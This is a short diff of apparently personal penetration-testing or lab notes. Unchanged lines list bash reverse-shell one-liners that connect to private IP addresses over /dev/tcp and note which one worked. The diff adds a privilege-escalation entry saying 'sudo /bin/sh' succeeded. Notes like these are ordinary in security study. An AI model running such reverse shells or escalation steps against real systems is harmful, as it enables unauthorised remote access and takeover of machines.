@@ -22,3 +22,5 @@
 	- bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 - The one that worked is weirdly 
 	- bash -c 'bash -i >& /dev/tcp/192.168.192.5/4444 0>&1'
+## Privilege Escalation 
+- Tried using sudo /bin/sh and it worked without problem.
